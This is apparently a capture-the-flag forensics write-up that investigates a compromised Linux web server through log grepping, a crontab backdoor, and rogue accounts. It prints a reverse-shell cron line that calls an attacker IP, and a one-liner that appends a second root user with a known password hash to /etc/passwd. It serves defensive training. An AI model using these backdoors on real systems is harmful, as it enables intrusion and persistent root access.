# Linux Server Essentials

```
	IP: 10.10.225.244
	Username: fred
	Password: FredRules!
```

**Table of Contents**

[Task-2](#task-2)

[Task-3](#task-3)

[Task-4](#task-4)

[Task-5](#task-5)

[Task-7](#task-7)

[Task-8](#task-8)

[Task-9](#task-9)

[Task-11](#task-11)


## Task-2

### How many different tools made requests to the server? 

Command: `grep -ioE "(nmap|nikto|dirbuster|sqlmap)" access.log | sort | uniq`

### Name a path requested by Nmap

Command: `grep -i "nmap" access.log" | more`

`/nmaplowercheck1618912425`


## Task-3

### What page allows users to upload files?

Checkout the files in **/var/www/html/**. 

`contact.php`

### What IP uploaded files to the server?

Checking **POST** requests for this will help. `grep POST access.log`

`192.168.56.24`

### Who left an exposed security notice on the server

`Repositories may now specify a security policy by creating a file named SECURITY.MD. This file should be used to instruct users about how and when to report security vulnerabilities to the repository maintainers. `

Can be found in log file using: `grep -i security.md access.log| grep -i get`

`192.168.56.24 - - [20/Apr/2021:09:55:34 +0000] "GET /resources/development/2021/docs/SECURITY.md HTTP/1.1" 200 507 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"`

Checking the file it seems the note is left by: `Fred`


## Task-4

### What command and option did the attacker use to establish a backdoor?

Things to check here:

```
cron
Services/systemd
bashrc
Kernel modules
SSH keys
```

cat the crontab and there it is `*  *    * * *   root2   sh -i >& /dev/tcp/192.168.56.206/1234 0>&1`

`sh -i`


## Task-5

### What is the password of the second root account? 

Executing the following command we can see the users: `grep -E "/bin/.*sh" /etc/passwd`

```
root:x:0:0:root:/root:/bin/bash
fred:x:1000:1000:fred:/home/fred:/bin/bash
root2:WVLY0mgH0RtUI:0:0:root:/root:/bin/bash
```

Cracking `WVLY0mgH0RtUI` with john did not gave me anything

Looking at the hint .. it seems passwords copied from some forum.. Let's google `hashWVLY0mgH0RtUI`

We get the below text from two different sources: [Github-repo](https://github.com/sinfulz/JustTryHarder/blob/master/Priv_Esc) [security.stackexchange](https://security.stackexchange.com/questions/151700/privilege-escalation-using-passwd-file)

```
# to create a second root user with "mrcake" password
echo "root2:WVLY0mgH0RtUI:0:0:root:/root:/bin/bash" >> /etc/passwd
```


## Task-7

### Name one of the non-standard HTTP Requests.

After checking the hint it seems as just not including the *POST* and *GET* method would do the trick.

`grep -vE "(POST|GET) access.log"`

In case the above command gives the following output:`Binary file access.log matches`  then just add *--text* to grep

`grep --text -vE "(GET|POST)" access.log`

```
192.168.56.206 - - [20/Apr/2021:13:30:15 +0000] "\x16\x03" 400 0 "-" "-"
192.168.56.206 - - [20/Apr/2021:13:30:15 +0000] "OPTIONS / HTTP/1.1" 200 181 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 l
ike Mac OS X) AppleWebKit/605.1.15 (KHTML"
192.168.56.206 - - [20/Apr/2021:13:30:15 +0000] "GXWR / HTTP/1.1" 501 498 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like
 Mac OS X) AppleWebKit/605.1.15 (KHTML"
```

We got our answer: `GXWR`

### At what time was the Nmap scan performed? (format: HH:MM:SS)

Just check the *GXWR* method log for time. 

`13:30:15`


## Task-8

### What username and hostname combination can be found in one of the authorized_keys files? (format: username@hostname) 

Login as root for this using `sudo -s` and supplying Fred's password.Let's check for *.ssh* directory in */home/fred*. There is none.
Let's check the */etc/passwd* file for home dir of root. It's */root*. Let's check the *.ssh/authorized* file and we have the following.

```
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDYCKt0bYP2YIwMWdJWqF3lr3Drs3sS9hiybsxz9W6dG6d15mg0SVMSe5H+rPM6VmzOKJaVpDjT1Ll5eR6YcbefTF2bMXHveyvcrzDxyZeWdgBs5u8/4DZxEN6fq6IZRRftmrMgMzSnpmdCm8kvacgq3lIjLx/sKAlX9GqPIz09t0Rk5MB7zk3lg1wdTZxZwwCHPbZW7mGlVcxNBB9wdbAmcvezscoF0i7v0tY8iCoFlrBysOMBMrEJji2UONtI/wrt7AvoK+gshiG7VTjZ2oQBacnyHRToXHxOZiSIbCQrJ6rCxa32QOGQNmAVIucqYjRbJedz0NbGq7M9B+hBmG/mdtsoGOXQKyzoUlAbulRXjSVtManiUyq9im1HBHfuduiBrbfcOKz24NMT7RaIsPsZCUCpfHaT7S5XplQypAjkxABds8jod/TXcTYibdWE9scrUUidgCsPELQlKEfhhZ8+cyjbMCGNB5LOgieJSVk6D1JC97TaFNi4X9/9i2UA+L0= kali@kali
```

There it is `kali@kali`.


## Task-9

### What is the first command present in root's bash_history file

Login as root and check the contents of */root/.bash_history* file using: `head /root/.bash_history`

```
nano /etc/passwd
exit
```

There it is `nano /etc/passwd`


## Task-11

Doing `systemctl status IPManager.service` we get the path for *.service* file:`/var/lib/network/IpManager.service`

Doing cat on the service file we get:

```bash
[UNIT]
Description=Network Management Service

[Service]
Type=simple
Restart=always
User=root
ExecStart=/bin/bash /etc/network/ZGtsam5hZG1ua2Fu.sh
[Install]
WantedBy=multi-user.target
```

that `/etc/network/ZGtsam5hZG1ua2Fu.sh` seems fishy. Let's check it out. 

```bash
##[gh0st_1n_the_machine]
## 
declare -a error_messages
error_messages[1]='ATTENTION!: THE BITBUCKET IS ALMOST FULL'
error_messages[2]='ACHTUNG!: DAS KOMPUTERMASCHINE IS NICHT GUD'
error_messages[3]='WARNING!: THE RAM FLANGES ARE IN THE OFF POSITION SAFE OPERATION OF RAM DRIVER IS NOT GUARANTEED!'
error_messages[4]='ERROR!: THE STACK ARRANGER IS NOT ENABLED BEWARE OF STACK COLLISIONS'
error_messages[5]='調試!: 如果發生堆棧衝突，則無法啟用堆棧!!!'
error_messages[6]='INFO!:  PURGING RAM BITS'
error_messages[7]='INFO!:  NODE GRAPH OUT OF DATE REBUILDING'
error_messages[8]='INFO!:  RETICULATING SPLINES'
error_messages[9]='WARNING!: DIHYDROGEN MONOXIDE DETECTED IN ATMOSPHERE'
error_messages[10]='INFO!: VENTING OXYGEN'
error_messages[11]='WARNING!: /dev/null IS 95% UTILIZED'
error_messages[12]='METTERE IN GUARDIA!: LE FLANGE DEL RAM SONO IN POSIZIONE OFF IL FUNZIONAMENTO SICURO DEL RAM DRIVER NON È GARANTITO!'


print_errors(){
    for i in {1..10000}; do
    tput setaf 1; wall -n "${error_messages[RANDOM%11]}" ; tput setaf  7;
    sleep 10
    if [[ $i -eq 3 ]]; then
        introduce_self
    fi
    done
}

introduce_self(){
    wall -n "Wow this system is really broken huh?"
    sleep 4
    wall -n "Wonder if I can fix it"
    sleep 4
    wall -n "Gonna borrow your shell for a second"
    sleep 4
    wall -n "root@acmeweb:~# ls"
    ls -al ~ | wall -n
    sleep 4
    wall -n "Hmm"
    sleep 4
    wall -n "Nothing suspicious here"
    wall -n "root@acmeweb:~# ps"
    ps
    wall -n "Nothing strange here either."
    sleep 4
    wall -n "root@acmeweb:~# cd /etc"
    sleep 2
    wall -n "root@acmeweb:/etc/# ls -al"
    ls -al /etc/ | wall -n
    sleep 4
    wall -n "Wonder if theres anyting in the crontab"
    sleep 4
    wall -n "root@acmweb:/etc/ cat crontab"
    cat /etc/crontab | wall -n
    sleep 4
    wall -n "Hmm nothing here either"
    sleep 4 
    wall -n "Seems to be running all the time, so it could be a broken service."
    sleep 4
    wall -n "It might be worth running systemctl -l and, looking for things out of the ordinary"
    sleep 4
    wall -n "Oh by they way your computer isn't sentient, it's just haunted so there's nothing to worry about"
    sleep 4
    cowsay -f ghostbusters "Just don't call these guys" | wall -n
}
print_errors
```

After checking the script out it seems it is just randomly generating error messages and some background messages in *introduce_self*. Checking the hint gave away the flag. It's the first line of script: `gh0st_1n_the_machine`.
